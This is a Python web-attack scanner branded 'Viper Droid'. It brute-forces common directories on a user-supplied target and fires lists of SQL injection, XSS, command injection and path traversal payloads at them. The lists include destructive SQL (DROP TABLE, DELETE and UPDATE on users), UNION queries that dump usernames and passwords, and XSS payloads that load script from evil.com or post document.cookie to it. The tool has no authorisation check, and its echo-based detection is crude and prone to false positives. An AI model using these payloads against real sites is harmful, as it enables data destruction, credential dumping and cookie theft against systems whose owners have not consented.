import aiohttp
import asyncio
import logging
import time
import os



def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_banner():
    banner = f"""
   
          ██╗   ██╗██╗██████╗ ███████╗███████╗██████╗ 
          ██║   ██║██║██╔══██╗██╔════╝██╔════╝██╔══██╗
          ██║   ██║██║██████╔╝█████╗  █████╗  ██████╔╝
          ██║   ██║██║██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗
          ╚██████╔╝██║██║     ███████╗███████╗██║  ██║
           ╚═════╝ ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝
                       Powered by Viper Droid
    ║                                                                ║
    ║          ⚡ Ultimate Injection Scanner by Viper Droid ⚡        ║
    ╚════════════════════════════════════════════════════════════════╝
    """
    print("\033[92m" + banner + "\033[0m")


def animated_text(text, delay=0.06):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    print()


# ----------------- 2. Vulnerability Scanner -----------------
class InjectionScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.injections = {
            "SQL Injection": [
                "' OR 1=1 --", "' OR 'a'='a' --", "' OR \"a\"=\"a\" --", "' OR '1'='1' --",
                "' OR 1=1#", "' OR 1=1/*", "' AND 1=1 --", "' AND 'x'='x' --", "' AND \"a\"=\"a\" --",
                "' AND 1=1#", "' AND 1=1/*", "' UNION SELECT null, null --", "' UNION SELECT 1, 'a', 1, 'b' --",
                "' UNION SELECT username, password FROM users --", "' UNION SELECT null, table_name FROM information_schema.tables --",
                "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users' --",
                "' AND 1=1 --", "' AND 1=2 --", "' AND \"a\"=\"a\" --", "' AND \"a\"=\"b\" --", "' OR \"a\"=\"b\" --",
                "' OR SLEEP(5) --", "' OR IF(1=1, SLEEP(5), 0) --", "' OR IF(1=1, BENCHMARK(1000000, SHA1(1)), 0) --",
                "' AND SLEEP(5) --", "' AND IF(1=1, SLEEP(5), 0) --", "' --", "\" --", "# --", "'/* --",
                "' OR 'a'='a' UNION SELECT null, null, table_name, column_name FROM information_schema.columns --",
                "' AND EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') --",
                "' OR 1=1 GROUP BY NULL HAVING 1=1 --", "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' OR 1=1 AND SUBSTRING(database(), 1, 1) = 'x' --", "%27 OR 1=1 --", "%22 OR 1=1 --", "%2A%2F --",
                "' OR 1=1 --", "' OR 'x'='x' --", "' OR \"x\"=\"x\" --", "' OR \"a\"=\"a\" --", "; DROP TABLE users --",
                "; SELECT * FROM users --", "; UPDATE users SET password = 'admin' WHERE username = 'admin' --",
                "; DELETE FROM users WHERE username = 'admin' --"
            ],
            "XSS": [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'></iframe>", "<body onload=alert('XSS')>", "<input onfocus=alert(1)>",
                "<script>document.location='javascript:alert(1)'</script>", "<script>eval('alert(1)')</script>",
                "<img src='x' onerror='alert(1)'>", "<a href='javascript:alert(1)'>Click me</a>", "<script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>", "<script src='http://evil.com/xss.js'></script>",
                "<object data='http://evil.com/xss.swf' type='application/x-shockwave-flash'></object>",
                "<script>eval('alert(document.cookie)')</script>", "<script>fetch('http://evil.com', {method: 'POST', body: document.cookie})</script>",
                "<img src='//evil.com/xss.png' onerror='alert(1)'>", "<div style='width: expression(alert(1));'>div</div>",
                "<body onload=confirm('XSS')>", "<form action='javascript:alert(1)'>Submit</form>", "<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>"
            ],
            "Command Injection": [
                "; ls", "&& echo 'test'", "| echo 'test'"
            ],
            "Path Traversal": [
                "../etc/passwd", "../../boot.ini", "../../../../etc/passwd"
            ]
        }
        logging.basicConfig(filename="injection_scan.log", level=logging.INFO,
                            format="%(asctime)s - %(levelname)s - %(message)s")

    async def test_injection(self, session, endpoint, injection_type, payload):
        target_url = f"{self.base_url}/{endpoint}?q={payload}"
        try:
            async with session.get(target_url, timeout=5) as response:
                if response.status == 200:
                    text = await response.text()
                    # Check for payload echoed or error messages
                    if payload.lower() in text.lower():
                        logging.info(f"[{injection_type}] Vulnerability found at {target_url}")
                        return f"[+] {injection_type} at {target_url}"
        except Exception as e:
            logging.error(f"Error scanning {target_url}: {e}")
        return None

    async def scan(self, endpoints):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for endpoint in endpoints:
                for injection_type, payloads in self.injections.items():
                    for payload in payloads:
                        tasks.append(self.test_injection(session, endpoint, injection_type, payload))
            results = await asyncio.gather(*tasks)
            return [result for result in results if result]


# ----------------- 3. Directory Scanner -----------------
class DirectoryScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.wordlist = [
            "admin", "login", "dashboard", "search", "register", "signup",
            "profile", "upload", "settings", "test", "api", "users",
            "data", "config", "help", "report", "logout", "home", "reset",
        ]

    async def scan_directories(self):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for word in self.wordlist:
                target_url = f"{self.base_url}/{word}"
                tasks.append(self.test_directory(session, target_url))
            results = await asyncio.gather(*tasks)
            return [result for result in results if result]

    async def test_directory(self, session, target_url):
        try:
            async with session.get(target_url, timeout=5) as response:
                if response.status == 200:
                    return target_url
        except Exception:
            pass
        return None


# ----------------- 4. Main Script -----------------
async def main():
    clear_screen()
    print_banner()
    animated_text("Welcome to the Ultimate Injection Scanner by Viper Droid...\n")

    base_url = input("\033[96mEnter the target URL (e.g., http://example.com): \033[0m").strip()
    if not base_url.startswith("http://") and not base_url.startswith("https://"):
        print("\033[91m[!] Invalid URL format. Please include 'http://' or 'https://'\033[0m")
        return

    # Directory scanning
    dir_scanner = DirectoryScanner(base_url)
    print("\033[92m[~] Scanning for common directories...\033[0m")
    directories = await dir_scanner.scan_directories()

    if directories:
        print("\033[92m[+] Directories found:\033[0m")
        for directory in directories:
            print(f"  - {directory}")
    else:
        print("\033[91m[!] No directories found. Scanning root URL only...\033[0m")
        directories = [""]  # Scan base URL if no directories found

    # Injection scanning
    injector = InjectionScanner(base_url)
    print("\033[92m[~] Scanning for vulnerabilities...\033[0m")
    vulnerabilities = await injector.scan(directories)

    if vulnerabilities:
        print("\n\033[91m--- Vulnerabilities Found ---\033[0m")
        for vuln in vulnerabilities:
            print("\033[91m" + vuln + "\033[0m")
    else:
        print("\033[92m[~] No vulnerabilities found.\033[0m")

    print("\n\033[96m[~] Logs saved in 'injection_scan.log'\033[0m")
    animated_text("Thank you for using Injection Scanner by Viper Droid!")


if __name__ == "__main__":
    asyncio.run(main())
